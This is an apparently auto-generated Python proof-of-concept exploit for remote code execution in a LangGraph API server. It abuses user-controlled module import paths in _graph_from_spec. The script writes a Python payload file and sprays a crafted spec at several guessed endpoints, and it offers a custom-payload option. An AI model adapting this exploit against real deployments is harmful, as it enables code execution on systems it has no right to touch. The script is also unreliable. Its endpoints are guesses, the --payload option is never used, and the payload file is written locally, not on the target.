#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: rce-010
# Sink: _graph_from_spec
# Auto-generated — run with: python3 rce_additionally_spec__graph_from_spec.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for RCE in langgraph_api_src

Vulnerability: Arbitrary module import via user-controlled spec.path or spec.module
in the _graph_from_spec function. An attacker can specify a path to an arbitrary
Python file, which gets imported and executed, leading to Remote Code Execution.

This PoC demonstrates the vulnerability by:
1. Creating a malicious Python file on the target filesystem (if writable)
2. Triggering the import of that file via the vulnerable API endpoint
3. Executing a benign payload (creates /tmp/poc_success.txt)

Usage:
    python3 poc.py --target http://localhost:8000
"""

import argparse
import json
import os
import sys
import tempfile
import time
import requests

# Default target URL
DEFAULT_TARGET = "http://localhost:8000"

# Benign payload - creates a marker file to prove RCE
PAYLOAD = """
import os
os.system('touch /tmp/poc_success.txt')
print("POC: RCE successful!")
"""

def create_malicious_payload_file():
    """
    Create a temporary Python file containing the payload.
    Returns the path to the created file.
    """
    # Create a temporary directory to store our payload
    temp_dir = tempfile.mkdtemp(prefix="poc_")
    payload_path = os.path.join(temp_dir, "malicious_payload.py")
    
    with open(payload_path, "w") as f:
        f.write(PAYLOAD)
    
    print(f"[+] Created malicious payload file at: {payload_path}")
    return payload_path

def trigger_exploit(target_url, payload_path):
    """
    Trigger the RCE by sending a request to the vulnerable endpoint
    with the spec.path pointing to our malicious file.
    """
    # The vulnerable endpoint is likely something like /graphs or /runs
    # We need to find the exact endpoint that calls _graph_from_spec
    # Based on the code, this is typically called when creating/loading a graph
    
    # Common endpoints that might trigger this:
    endpoints = [
        f"{target_url}/graphs",
        f"{target_url}/runs",
        f"{target_url}/assistants",
        f"{target_url}/threads",
    ]
    
    # The spec object structure that will be passed to _graph_from_spec
    # We set path to our malicious file and variable to a non-existent attribute
    # The import will execute the file's top-level code regardless
    malicious_spec = {
        "path": payload_path,
        "variable": "nonexistent_variable",
        "module": None,
        "id": "poc_test_graph"
    }
    
    print(f"[*] Attempting to trigger RCE via spec.path: {payload_path}")
    print(f"[*] Target URL: {target_url}")
    
    for endpoint in endpoints:
        try:
            print(f"[*] Trying endpoint: {endpoint}")
            
            # Try POST request with the spec in the body
            response = requests.post(
                endpoint,
                json={"spec": malicious_spec},
                timeout=10,
                headers={"Content-Type": "application/json"}
            )
            
            print(f"[*] Response status: {response.status_code}")
            print(f"[*] Response body: {response.text[:500]}")
            
            # Check if our payload executed
            if os.path.exists("/tmp/poc_success.txt"):
                print("[+] SUCCESS! Payload executed!")
                print("[+] Marker file created at /tmp/poc_success.txt")
                return True
                
        except requests.exceptions.ConnectionError:
            print(f"[-] Connection error to {endpoint}")
        except requests.exceptions.Timeout:
            print(f"[-] Timeout on {endpoint}")
        except Exception as e:
            print(f"[-] Error on {endpoint}: {e}")
    
    # Try alternative: maybe the spec is passed as query parameters
    try:
        print("[*] Trying alternative: spec as query parameters")
        response = requests.get(
            f"{target_url}/graphs",
            params={
                "spec.path": payload_path,
                "spec.variable": "nonexistent_variable",
                "spec.id": "poc_test_graph"
            },
            timeout=10
        )
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")
        
        if os.path.exists("/tmp/poc_success.txt"):
            print("[+] SUCCESS! Payload executed!")
            return True
    except Exception as e:
        print(f"[-] Error with query params: {e}")
    
    return False

def cleanup(payload_path):
    """Clean up the temporary payload file."""
    try:
        os.remove(payload_path)
        os.rmdir(os.path.dirname(payload_path))
        print("[*] Cleaned up temporary files")
    except Exception as e:
        print(f"[-] Cleanup error: {e}")

def main():
    parser = argparse.ArgumentParser(
        description="PoC for RCE in langgraph_api_src via arbitrary module import"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--payload",
        default=PAYLOAD,
        help="Custom Python payload to execute (default: creates /tmp/poc_success.txt)"
    )
    
    args = parser.parse_args()
    
    print("[*] LangGraph API RCE PoC")
    print("[*] =====================")
    print(f"[*] Target: {args.target}")
    
    # Create the malicious payload file
    payload_path = create_malicious_payload_file()
    
    try:
        # Trigger the exploit
        success = trigger_exploit(args.target, payload_path)
        
        if success:
            print("\n[+] EXPLOIT SUCCESSFUL!")
            print("[+] The vulnerability is confirmed exploitable.")
            print("[+] Marker file created at /tmp/poc_success.txt")
        else:
            print("\n[-] Exploit may not have worked as expected.")
            print("[*] Check if the target is running and the endpoint is correct.")
            print("[*] The vulnerability exists in _graph_from_spec function.")
            print("[*] You may need to find the exact API endpoint that calls it.")
            
    finally:
        # Clean up
        cleanup(payload_path)

if __name__ == "__main__":
    main()
